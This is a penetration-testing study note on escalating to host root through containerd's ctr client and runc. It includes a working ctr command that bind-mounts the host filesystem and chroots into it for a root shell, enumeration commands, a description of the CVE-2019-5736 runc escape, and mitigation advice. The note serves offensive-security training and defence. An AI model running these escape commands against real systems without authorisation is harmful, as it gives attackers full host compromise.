---
tags: [linux, privesc, containers, pentesting, red-team]
difficulty: advanced
module: "44 - Linux Privilege Escalation"
topic: "44.36 Container Runtime PrivEsc (containerd / runc)"
---

# Container Runtime PrivEsc (containerd / runc)

## Introduction
Beyond Docker group membership ([[19 - Docker Group Membership]]) and LXC/LXD ([[20 - LXC LXD Group Abuse]]), the **lower-level container runtimes** themselves — `containerd` (with its `ctr` CLI) and `runc` (the OCI runtime that actually creates containers) — present their own privilege-escalation paths. Access to these runtimes is frequently equivalent to root on the host, and `runc` has had a famous container-escape vulnerability (**CVE-2019-5736**). This note covers escalating via direct runtime access and the runtime-escape bug class.

## containerd / `ctr` Abuse
`containerd` is the daemon Docker (and Kubernetes) use under the hood; `ctr` is its low-level client. The `containerd` socket (`/run/containerd/containerd.sock`) is **root-owned**, but if your user can reach it (group membership, lax permissions, or you are inside a privileged context), you can run a container that mounts the host filesystem — identical in payoff to the Docker-socket escape:

```bash
# If you can talk to containerd directly:
ctr image pull docker.io/library/alpine:latest
ctr run --rm --mount type=bind,src=/,dst=/host,options=rbind:rw \
    docker.io/library/alpine:latest hostroot \
    chroot /host sh        # root shell on the HOST filesystem
```

```text
+---------------------------------------------------------------+
|         RUNTIME ACCESS == HOST ROOT                          |
+---------------------------------------------------------------+
|  reach containerd.sock / ctr                                  |
|        |  run container with host / bind-mounted              |
|        v                                                       |
|  chroot into /host  ->  read/write host files as root         |
|        |  (write /etc/passwd, drop SUID, cron, ssh key)       |
|        v                                                       |
|  full host compromise                                         |
+---------------------------------------------------------------+
```
Check access:
```bash
ls -l /run/containerd/containerd.sock
id; groups            # docker / containerd-adjacent groups
which ctr nerdctl crictl
```

## runc Abuse and Escape (CVE-2019-5736)
`runc` is the binary that spawns containers. **CVE-2019-5736** is a container *escape*: a malicious container could overwrite the host's `runc` binary by abusing `/proc/self/exe`. When the runtime re-executed `runc` (e.g. `docker exec` into the container), the host ran the attacker-overwritten binary **as root on the host** — escaping the container.

```text
   Malicious container
        |  points an entrypoint/exec at /proc/self/exe (the host runc)
        v
   When host runs `runc` again (exec into container)
        |  attacker's code overwrites the host runc binary
        v
   Next runc invocation executes attacker code as ROOT on host
```
This requires the attacker to control a container image/exec and an unpatched `runc`. Mitigated by patched `runc` (read-only `/proc/self/exe` handling) and by user namespaces.

### runc as a root SUID/sudo target
If `runc` itself is invocable with privilege (sudo rule, or a writable runtime state directory), it can be driven to create a container with a host bind-mount — same chroot-to-host payoff as the `ctr` case.

## Enumeration Checklist
```bash
# runtimes present + versions (map runc version to CVE-2019-5736)
runc --version; containerd --version; docker --version 2>/dev/null
# sockets you can reach
ls -l /run/containerd/containerd.sock /var/run/docker.sock 2>/dev/null
# am I inside a container? (then look for escape conditions)
cat /proc/1/cgroup; ls -la /.dockerenv 2>/dev/null
# privileged container indicators (escape easier): caps, host mounts
capsh --print 2>/dev/null; mount | grep -i host
```

## Why It Matters in an Engagement
Container runtimes are everywhere (CI runners, Kubernetes nodes, dev boxes). Any path to the runtime socket or to invoking `ctr`/`runc` with privilege collapses the container boundary and yields host root. The `runc` escape class shows that even a *fully unprivileged* container can reach the host if the runtime is unpatched.

## Detection and Mitigation
- Keep `runc`/`containerd`/Docker patched (CVE-2019-5736 and successors); enable **user namespaces** so container root ≠ host root.
- Restrict access to `containerd.sock`/`docker.sock`; never bind-mount these into containers.
- Avoid `--privileged` containers and host bind-mounts; apply seccomp/AppArmor/SELinux profiles ([[37 - SELinux Enumeration and Bypass]]).
- Monitor for `ctr/runc/nerdctl` execution by non-root users and for containers mounting `/` or the runtime socket.

## Chaining Opportunities
- Same payoff as [[19 - Docker Group Membership]] / [[20 - LXC LXD Group Abuse]] — all reduce to "container control = host root".
- Inside Kubernetes nodes, combine with node-level container escapes (see Cloud/Container module).

## Related Notes
- [[19 - Docker Group Membership]]
- [[20 - LXC LXD Group Abuse]]
- [[37 - SELinux Enumeration and Bypass]]
- [[23 - Kernel Exploits]]
